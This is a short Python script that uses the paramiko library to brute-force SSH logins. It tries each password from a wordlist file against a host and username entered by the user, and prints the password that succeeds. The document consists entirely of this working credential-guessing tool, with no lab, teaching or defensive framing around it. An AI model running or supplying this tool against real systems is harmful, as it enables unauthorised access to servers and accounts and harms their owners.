# Libraries
import paramiko

count = 1

def connectSSH(hostname, port, username, passFile):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    with open(passFile, "r") as f:
        global count
        for password in f.readlines():
            password = password.strip()
            try:
                client.connect(hostname, port=port, username=username, password=password)
                print("[" + str(count) + "] " + "[+] Password Success ~ " + password)
                print("*" * 50)
                print("HostName: " + hostname)
                print("UserName: " + username)
                print("Password: " + password)
                print("*" * 50)
                break
            except:
                print("[" + str(count) + "] " + "[-] Password Failed ~ " + password)
                count += 1

hostname = input("[*] Enter HostName: ")
username = input("[*] Enter UserName: ")
passwordFile = input("[*] Enter Passwords File: ")

connectSSH(hostname, 22, username, passwordFile)
